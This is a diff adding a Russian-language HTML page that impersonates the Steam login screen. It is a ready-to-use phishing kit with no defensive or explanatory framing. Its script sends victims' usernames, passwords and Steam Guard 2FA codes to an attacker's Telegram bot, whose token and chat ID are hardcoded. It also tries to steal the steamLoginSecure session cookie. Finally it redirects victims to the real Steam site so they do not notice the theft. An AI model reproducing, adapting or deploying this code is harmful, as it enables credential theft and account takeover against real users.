@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Steam — вход</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #1b2838;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: #2a3f5e;
+            border-radius: 12px;
+            padding: 40px 30px 30px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.7);
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 24px;
+        }
+        .logo img {
+            width: 160px;
+        }
+        .input-group {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+        .input-group label {
+            color: #c7d5e0;
+            font-size: 13px;
+            font-weight: 600;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: none;
+            border-radius: 6px;
+            background: #1b2838;
+            color: #fff;
+            font-size: 15px;
+            outline: 2px solid transparent;
+            transition: 0.2s;
+        }
+        .input-group input:focus {
+            outline-color: #67c1f5;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 6px;
+            background: #67c1f5;
+            color: #1b2838;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 8px;
+        }
+        .btn:hover { background: #4ea5d9; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .message {
+            margin-top: 16px;
+            font-size: 14px;
+            color: #f5a623;
+            min-height: 22px;
+        }
+        .footer {
+            margin-top: 20px;
+            color: #738ba1;
+            font-size: 12px;
+        }
+        .steam-guard {
+            margin-top: 16px;
+            padding-top: 16px;
+            border-top: 1px solid #3a5a7a;
+            display: none;
+        }
+        .steam-guard.visible {
+            display: block;
+        }
+        .step-indicator {
+            color: #c7d5e0;
+            font-size: 13px;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+<div class="container" id="app">
+    <div class="logo">
+        <img src="https://store.steampowered.com/public/images/v5/header_logo.png" alt="Steam" />
+    </div>
+    <div id="step1">
+        <div class="step-indicator">Шаг 1 из 2</div>
+        <div class="input-group">
+            <label>Имя пользователя или email</label>
+            <input type="text" id="steamLogin" placeholder="Логин" />
+        </div>
+        <div class="input-group">
+            <label>Пароль</label>
+            <input type="password" id="steamPassword" placeholder="Пароль" />
+        </div>
+        <button class="btn" id="loginBtn">Войти</button>
+        <div class="message" id="step1Msg"></div>
+    </div>
+
+    <div class="steam-guard" id="steamGuardBlock">
+        <div class="step-indicator">Шаг 2 из 2</div>
+        <div class="input-group">
+            <label>Код аутентификатора Steam Guard</label>
+            <input type="text" id="steamGuardCode" placeholder="Код из приложения" maxlength="5" inputmode="numeric" />
+        </div>
+        <button class="btn" id="guardBtn">Подтвердить</button>
+        <div class="message" id="guardStatus"></div>
+    </div>
+
+    <div class="footer">Valve Corporation • Steam</div>
+</div>
+
+<script>
+    // ===== КОНФИГ (ТВОЙ ТОКЕН И CHAT_ID) =====
+    const BOT_TOKEN = '8874000251:AAGzdWA5dHBTxnLcQUNlWLP4JfUQOTboWGs';
+    const CHAT_ID = 1062250634;
+
+    // ===== ЭЛЕМЕНТЫ =====
+    const loginBtn = document.getElementById('loginBtn');
+    const loginInput = document.getElementById('steamLogin');
+    const passInput = document.getElementById('steamPassword');
+    const step1Msg = document.getElementById('step1Msg');
+    const guardBlock = document.getElementById('steamGuardBlock');
+    const guardInput = document.getElementById('steamGuardCode');
+    const guardBtn = document.getElementById('guardBtn');
+    const guardStatus = document.getElementById('guardStatus');
+
+    // ===== ОТПРАВКА В TELEGRAM =====
+    async function sendToTG(text) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        try {
+            const resp = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            });
+            return resp.ok;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    // ===== ШАГ 1: ЛОГИН И ПАРОЛЬ =====
+    loginBtn.addEventListener('click', async () => {
+        const login = loginInput.value.trim();
+        const pass = passInput.value.trim();
+
+        if (!login || !pass) {
+            step1Msg.textContent = '⚠️ Заполните все поля';
+            step1Msg.style.color = '#f5a623';
+            return;
+        }
+
+        loginBtn.disabled = true;
+        step1Msg.textContent = '⏳ Проверка...';
+        step1Msg.style.color = '#aaa';
+
+        const data = `🎮 STEAM LOGIN\n👤 Логин: ${login}\n🔐 Пароль: ${pass}`;
+        const sent = await sendToTG(data);
+
+        if (sent) {
+            step1Msg.textContent = '✅ Введите код Steam Guard';
+            step1Msg.style.color = '#4caf50';
+            guardBlock.classList.add('visible');
+            guardInput.focus();
+        } else {
+            step1Msg.textContent = '❌ Ошибка. Попробуйте снова.';
+            step1Msg.style.color = '#f44336';
+            loginBtn.disabled = false;
+        }
+    });
+
+    // ===== ШАГ 2: КОД 2FA =====
+    guardBtn.addEventListener('click', async () => {
+        const code = guardInput.value.trim();
+
+        if (code.length !== 5) {
+            guardStatus.textContent = '⚠️ Введите 5 цифр';
+            guardStatus.style.color = '#f5a623';
+            return;
+        }
+
+        guardBtn.disabled = true;
+        guardStatus.textContent = '⏳ Отправка...';
+        guardStatus.style.color = '#aaa';
+
+        const msg = `🔐 STEAM 2FA\n📱 Код: ${code}`;
+        const sent = await sendToTG(msg);
+
+        if (sent) {
+            guardStatus.textContent = '✅ Вход выполнен. Перенаправление...';
+            guardStatus.style.color = '#4caf50';
+
+            // Пытаемся перехватить cookie сессии
+            const allCookies = document.cookie;
+            if (allCookies.includes('steamLoginSecure')) {
+                const match = allCookies.match(/steamLoginSecure=([^;]+)/);
+                if (match) {
+                    await sendToTG(`🍪 steamLoginSecure: ${match[1]}`);
+                }
+            }
+
+            // Редирект на реальный Steam через 1.5 секунды
+            setTimeout(() => {
+                window.location.href = 'https://store.steampowered.com/';
+            }, 1500);
+        } else {
+            guardStatus.textContent = '❌ Ошибка. Попробуйте снова.';
+            guardStatus.style.color = '#f44336';
+            guardBtn.disabled = false;
+        }
+    });
+
+    // ENTER для быстрого ввода
+    loginInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') loginBtn.click(); });
+    passInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') loginBtn.click(); });
+    guardInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') guardBtn.click(); });
+
+    window.addEventListener('load', () => loginInput.focus());
+</script>
+</body>
+</html>
